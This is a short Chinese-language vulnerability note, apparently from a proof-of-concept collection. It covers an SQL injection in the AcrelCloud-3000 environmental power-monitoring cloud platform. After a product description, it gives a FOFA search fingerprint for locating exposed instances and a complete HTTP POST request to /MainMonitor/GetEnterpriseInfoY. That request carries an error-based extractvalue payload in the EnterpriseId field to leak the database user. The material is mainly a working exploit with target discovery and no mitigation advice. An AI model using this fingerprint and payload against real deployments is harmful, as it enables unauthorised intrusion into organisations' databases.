# 安科瑞环保用电监管云平台etEnterpriseInfoY存在SQL注入漏洞

AcrelCloud-3000环保用电监管云平台依托创新的物联网电力传感技术，实时采集企业总用电、生产设备及环保治理设备用电数据，通过关联分析、超限分析、停电分析、停限产分析，结合及时发现环保治理设备未开启、异常关闭及减速、空转、降频等异常情况，同时通过数据分析还可以实时监控限产和停产整治企业运行状态，用户可以利用PC、手机、平板电脑等多种终端实现对平台的访问。

## fofa

```javascript
body="myCss/phone.css"
```

## poc

```javascript
POST /MainMonitor/GetEnterpriseInfoY HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/plain, */*; q=0.01

EnterpriseId=2107265665700008%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cuser%28%29%29%29and%27&Type=4
```

![image-20241227215812734](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272158792.png)